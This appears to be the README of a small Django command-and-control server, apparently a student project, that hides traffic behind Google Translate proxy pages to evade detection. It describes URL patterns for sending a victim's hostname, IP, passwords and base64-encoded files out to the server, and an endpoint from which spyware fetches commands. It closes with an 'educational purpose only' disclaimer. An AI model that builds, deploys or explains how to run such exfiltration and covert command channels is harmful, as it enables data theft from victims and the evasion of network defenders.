# EFREI-C2-Example
A simple C2 meant to be used behind Google Translate Webpages as a proxy for data evasion.

## Requirements
- Python 3.x
- Django (https://www.djangoproject.com/download/)

## Setup
- Create an admin user: ``python manage.py createsuperuser --username <username>``
- Log on the admin dashboard at ``127.0.0.1:8000/admin``

## Usage
### Exfiltration
- Data are collected directly from the URL
- simply send data to the base URL: ``https://your-domain.translate.goog/<hostname>/<ip>/<data_type>/<?hash_file>/<data>/``
  - ``hostname`` is your victim hostname.
  - ``ip`` is your victim ip address.
  - ``data_type`` is the keyword you want to filter data. It can be for example a password type.
  - ``hash_file`` is a flag to know if the exfiltrated data is a file or a string. You must send the hash of the file you want to upload to recreate the file. It allows the admin dashboard to know if it has to decode the received data or not. **(OPTIONAL)**
  - ``data`` is the content you want to exfiltrate. If it's a file, it can be encoded in base64 and decoded automatically on the admin dashboard. If it's a base64 data, you must split it into multiple strings otherwise Google Translate will limit you.

### Sending command
- Fetch the following link from your client/spyware: ``https://your-domain.translate.goog/c/<hostname>/<ip>/``

You can expand the size of the data by editing ``collector\models.py`` and edit the ``max_length=<your value>`` for the ``data_content`` field.
# FOR EDUCATIONAL PURPOSE ONLY
